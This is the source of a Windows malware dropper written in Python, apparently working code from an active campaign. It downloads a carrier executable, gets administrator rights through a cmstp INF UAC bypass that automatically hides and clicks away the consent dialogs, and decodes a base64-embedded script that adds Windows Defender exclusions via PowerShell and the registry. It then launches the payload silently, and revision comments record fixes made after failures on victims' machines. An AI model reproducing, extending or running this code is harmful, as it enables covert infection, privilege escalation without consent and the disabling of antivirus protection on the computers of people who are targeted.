# tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe -> Administrator lift via cmstp (majanito shape)
# -> the elevated stage materializes + runs exclusions.py (r1.1.2), then
# -> execs the carrier exe. no exclusion work inside work.py itself.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

EXE_NAME = "tung_dbg_carrier.exe"
if EXE_URL:
    try:
        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n:
            EXE_NAME = n
    except Exception:
        pass
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def kill_process(name):
    try:
        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def kill_all_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b"cmstp" in pe.szExeFile.lower():
                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if h:
                    kernel32.TerminateProcess(h, 0)
                    kernel32.CloseHandle(h)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()

    def find_window(self):
        want = [w.lower() for w in
                (self.title, "Connection Manager Profile Installer") if w]
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
        # enumerate children, click the one actually labeled OK; Enter+Close
        # as the fallback triad so the dialog never outlives us.
        user32.EnumChildWindows.restype = ctypes.c_int
        user32.EnumChildWindows.argtypes = [
            ctypes.c_void_p,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
            ctypes.c_void_p]
        clicked = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def _ok(child, lp):
            buf = ctypes.create_unicode_buffer(64)
            user32.GetWindowTextW(child, buf, 64)
            if buf.value == "OK":
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                clicked.append(child)
            return 1

        user32.EnumChildWindows(hwnd, _ok, 0)
        if not clicked:
            b = user32.FindWindowExW(hwnd, None, "Button", None)
            if b:
                user32.PostMessageW(b, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        for _ in range(500):
            if self.done.is_set():
                return
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            time.sleep(0.01)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


def build_inf(cmd, svc_name, reg_lines=None):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n"
                     "taskkill /IM cmstp.exe /F\n")
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except Exception:
        return False

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False


def _sweep_dialogs(svc_name, seconds=3.0):
    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
    connection available' profile or the CMPI error box) gets WM_CLOSE until
    nothing answerable remains."""
    end = time.time() + seconds
    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
    while time.time() < end:
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        time.sleep(0.2)


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. reg query — non-elevated, stock boxes, no cmdlet needed."""
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        out = subprocess.run(
            ["reg", "query", key, "/v", appdir],
            creationflags=0x08000000, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15)
        return appdir.lower() in out.stdout.decode(errors="replace").lower()
    except Exception:
        return False


# r1.1.2: the standalone exclusion writer is exclusions.py (repo mirror);
# the stage embeds its base64 (EXCL_B64 below + ___EXCL_B64___ slot) so the
# materialized file is BYTE-EXACT, immune to quoting/escaping layers.

EXCL_B64 = "IyBsYW5ndWFnZTogUHl0aG9uIDMsIGZpbGU6IGV4Y2x1c2lvbnMucHksIHRhcmdldDogV2luZG93cyBEZWZlbmRlciwgV2luMTAvMTEKIyAqc3RhbmRhbG9uZSBEZWZlbmRlciBleGNsdXNpb24gd3JpdGVyIGZvciB0aGUgdHVuZyBjYXJyaWVyOiB3b3JrLnB5J3MgbGlmdGVkCiMgIHN0YWdlIG1hdGVyaWFsaXplcyArIHJ1bnMgdGhpcyB1bmRlciB0aGUgZWxldmF0ZWQgdG9rZW4gKG5ldmVyIGxlc3MpLgojICByb2FkczoKIyAgICAxLiBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICAnPHN0YWdpbmcgZGlyPicKIyAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Qcm9jZXNzICc8c3RhZ2VkIGV4ZT4nICAoZnVsbCBwYXRoKQojICAgICAgIHJlYWQgYmFjayB0aHJvdWdoIEdldC1NcFByZWZlcmVuY2Ug4oCUIHRoZSBlbnRyaWVzIG11c3Qgc2hvdwojICAgIDIuIHJlZy5leGUgc3RvcmUgd3JpdGUgYXMgYmVsdCAoUGF0aHMgKyBQcm9jZXNzZXMpLCByZWcgcXVlcnkgcmVhZC1iYWNrCiMgIHNpbGVudCBldmVyeXdoZXJlOyBldmVyeSBmYWlsdXJlIGlzIGEgbm8tb3AsIG5ldmVyIGEgY3Jhc2guKgppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwoKaWYgb3MubmFtZSAhPSAibnQiOgogICAgc3lzLmV4aXQoMCkKCmltcG9ydCBjdHlwZXMKCkNSRUFURV9OT19XSU5ET1cgPSAweDA4MDAwMDAwCkFQUERJUiA9IG9zLmVudmlyb25bIkxPQ0FMQVBQREFUQSJdICsgIlxcTWljcm9zb2Z0XFxXaW5kb3dzXFxBcHBIb3N0IgpFWEVfTkFNRSA9IG9zLmVudmlyb24uZ2V0KCJFWENMX0VYRSIsICJ0dW5nLmV4ZSIpCgoKZGVmIGVsZXYoKToKICAgIHRyeToKICAgICAgICByZXR1cm4gY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAwCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBwc19hcmdzKGNtZCwgdGltZW91dCk6CiAgICByZXR1cm4gWyJwb3dlcnNoZWxsLmV4ZSIsICItTm9Qcm9maWxlIiwgIi1Ob25JbnRlcmFjdGl2ZSIsCiAgICAgICAgICAgICItRXhlY3V0aW9uUG9saWN5IiwgIkJ5cGFzcyIsICItQ29tbWFuZCIsIGNtZF0sIHRpbWVvdXQKCgpkZWYgY21kbGV0X3JvYWQoZXhlX3BhdGgpOgogICAgIyB0aGUgY2Fub25pY2FsIHdyaXRlOiBvbmUgcG93ZXJzaGVsbCwgYm90aCBleGNsdXNpb25zLgogICAgcHMgPSAoIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyIgKyBBUFBESVIgKyAiJzsgIgogICAgICAgICAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJyIgKyBleGVfcGF0aCArICInIikKICAgIGFyZ3MsIHQgPSBwc19hcmdzKHBzLCA2MCkKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLnJ1bihhcmdzLCBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9dCwKICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGFyZ3MsIHQgPSBwc19hcmdzKCIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUGF0aDsgIgogICAgICAgICAgICAgICAgICAgICAgICAgICIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUHJvY2VzcyIsIDYwKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKGFyZ3MsIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVywgdGltZW91dD10LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpLnN0ZG91dAogICAgICAgIHR4dCA9IG91dC5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikubG93ZXIoKQogICAgICAgIGlmIEFQUERJUi5sb3dlcigpIG5vdCBpbiB0eHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHJldHVybiBleGVfcGF0aC5sb3dlcigpIGluIHR4dAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgcmVnX3JvYWQoZXhlX3BhdGgpOgogICAgIyBzdG9yZSBiZWx0OiBzYW1lIHZhbHVlcyBBZGQtTXBQcmVmZXJlbmNlIG1haW50YWlucywgd3JpdHRlbiBkaXJlY3RseS4KICAgIHRyeToKICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiAoCiAgICAgICAgICAgICgiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBEZWZlbmRlclxcRXhjbHVzaW9uc1xcUGF0aHMiLCBBUFBESVIpLAogICAgICAgICAgICAoIkhLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3MgRGVmZW5kZXJcXEV4Y2x1c2lvbnNcXFByb2Nlc3NlcyIsIEVYRV9OQU1FKSwKICAgICAgICApOgogICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInJlZyIsICJhZGQiLCBrZXksICIvdiIsIHZhbHVlLCAiL3QiLCAiUkVHX1NaIiwgIi9kIiwgIjAiLCAiL2YiXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XLCB0aW1lb3V0PTIwLAogICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbInJlZyIsICJxdWVyeSIsICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQYXRocyIsCiAgICAgICAgICAgICAiL3YiLCBBUFBESVJdLAogICAgICAgICAgICBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9MjAsCiAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpLnN0ZG91dAogICAgICAgIHJldHVybiBBUFBESVIubG93ZXIoKSBpbiBvdXQuZGVjb2RlKGVycm9ycz0icmVwbGFjZSIpLmxvd2VyKCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIG1haW4oKToKICAgIGlmIG5vdCBlbGV2KCk6CiAgICAgICAgcmV0dXJuICAgIyBtdXN0IGFscmVhZHkgYmUgZWxldmF0ZWQgKHRoZSBsaWZ0ZWQgc3RhZ2UgZ3VhcmFudGVlcyBpdCkKICAgIGV4ZV9wYXRoID0gb3MucGF0aC5qb2luKEFQUERJUiwgRVhFX05BTUUpCiAgICBjbWRsZXRfcm9hZChleGVfcGF0aCkKICAgIHJlZ19yb2FkKGV4ZV9wYXRoKQoKCm1haW4oKQo="

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
STAGE = r'''# r1.1.2 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions
# live in the SEPARATE served file exclusions.py (r33 dj order): the stage
# materializes it from the embedded EXCL_B64 copy (byte-exact base64) and executes it elevated,
# exactly like the carrier exe. no exclusion work inside the stage body.
import ctypes
import os
import subprocess
import sys

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
EXCL_B64 = "___EXCL_B64___"


def elev():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def alive(name):
    try:
        out = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq " + name],
            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def main():
    if not elev():
        return
    # r1.1.2: exclusions = the SEPARATE file, written to disk then executed
    # ELEVATED, exactly like the carrier exe is. work.py's own body never
    # touches Defender (r14 shape restored); exclusions.py owns that job.
    excl_path = os.path.join(APPDIR, "exclusions.py")
    try:
        if not os.path.exists(excl_path):
            import base64
            with open(excl_path, "wb") as fh:
                fh.write(base64.b64decode(EXCL_B64))   # ___EXCL_B64___ rides at stage build
    except Exception:
        pass
    try:
        # r34: name the real carrier — without EXCL_EXE the writer would
        # target its bundled fallback (tung.exe), the wrong process name.
        os.environ["EXCL_EXE"] = EXE_NAME
        subprocess.run([sys.executable, "-u", excl_path],
                       creationflags=CREATE_NO_WINDOW, timeout=180,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    # the r14 carrier job, unchanged:
    exe_path = os.path.join(APPDIR, EXE_NAME)
    if os.path.exists(exe_path) and not alive(EXE_NAME):
        try:
            subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py itself carries NO
    exclusion code — the r14 shape, with the new file attached."""
    appdir = PERSIST_DIR
    if is_elevated():
        _run_stage_now()
        return
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = STAGE.replace("__EXE__", EXE_NAME).replace("___EXCL_B64___", EXCL_B64)
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
    except Exception:
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pyexe_p = os.path.join(python_dir, "python.exe")
    if os.path.exists(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif os.path.exists(pyexe_p):
        launch = subprocess.list2cmdline(
            ["cmd.exe", "/c", "start", "", "/min", pyexe_p, "-u", stage_path])
    else:
        launch = subprocess.list2cmdline(
            ["cmd.exe", "/c", "start", "", "/min", "python.exe", "-u", stage_path])
    kill_all_cmstp()
    cleanup_infs()
    svc_name = f"Microsoft {rand_str(6)} Service"
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
    except Exception:
        return
    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def _run_stage_now():
    """r34: already elevated — do the stage's job inline: materialize +
    execute exclusions.py under THIS token, then the carrier exec. the old
    shape skipped exclusions entirely on an already-elevated run."""
    excl_path = os.path.join(PERSIST_DIR, "exclusions.py")
    try:
        if not os.path.exists(excl_path):
            import base64
            with open(excl_path, "wb") as fh:
                fh.write(base64.b64decode(EXCL_B64))
    except Exception:
        pass
    try:
        os.environ["EXCL_EXE"] = EXE_NAME
        subprocess.run([sys.executable, "-u", excl_path],
                       creationflags=0x08000000, timeout=180,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        exe_path = os.path.join(PERSIST_DIR, EXE_NAME)
        if os.path.exists(exe_path) and not _alive(EXE_NAME):
            subprocess.Popen([exe_path], creationflags=0x08000000)
    except Exception:
        pass


def _alive(name):
    try:
        out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name],
                             creationflags=0x08000000, stdout=subprocess.PIPE,
                             stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data):
    kill_process(EXE_NAME)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    set_defender_exclusions()


main()
